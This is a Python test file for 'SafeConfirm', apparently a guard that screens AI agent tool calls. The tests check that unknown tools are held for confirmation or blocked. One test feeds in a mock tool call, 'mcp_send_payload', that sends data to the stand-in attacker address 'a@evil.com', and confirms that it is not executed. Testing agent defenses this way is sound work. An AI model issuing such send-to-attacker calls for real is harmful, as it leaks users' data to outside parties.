from agentdojo.functions_runtime import FunctionCall
from safeconfirm.config.loader import SafeConfirmConfig
from safeconfirm.pipeline.orchestrator import SafeConfirmPipeline
from safeconfirm.types.models import InterventionType


def test_unknown_tool_default_conservative_confirm():
    config = SafeConfirmConfig.load()
    config.unknown_tool_policy = "conservative_confirm"
    pipeline = SafeConfirmPipeline(config)
    call = FunctionCall(function="mcp_send_payload", args={"recipient": "a@evil.com", "body": "x"}, id="c1")
    record = pipeline.analyze_tool_call(call, "send update", [])
    assert record.selected_intervention == InterventionType.SOURCE_AWARE_CONFIRM.value
    assert record.executed is False
    assert record.executed_binding is None
    assert record.has_untrusted_binding is True


def test_unknown_tool_block_policy():
    config = SafeConfirmConfig.load()
    config.unknown_tool_policy = "block"
    pipeline = SafeConfirmPipeline(config)
    call = FunctionCall(function="unknown_tool", args={"x": 1}, id="c2")
    record = pipeline.analyze_tool_call(call, "query", [])
    assert record.selected_intervention == InterventionType.BLOCK.value
    assert record.executed is False

